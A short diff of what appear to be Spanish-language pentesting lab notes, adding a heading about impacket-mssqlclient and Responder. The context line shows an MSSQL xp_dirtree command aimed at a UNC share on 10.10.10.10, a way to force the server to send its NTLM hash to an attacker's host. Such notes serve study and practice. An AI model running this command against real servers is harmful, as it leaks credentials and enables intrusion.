@@ -145,6 +145,6 @@ EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\test', 1, 1
 ```
 ![[Pasted image 20240328222914.png]]
 
-###
-
+### impacket-mssqlclient + responder
+apuntamos a un recurso que no existe en nuestra maquina 
 ![[Pasted image 20240328224406.png]]
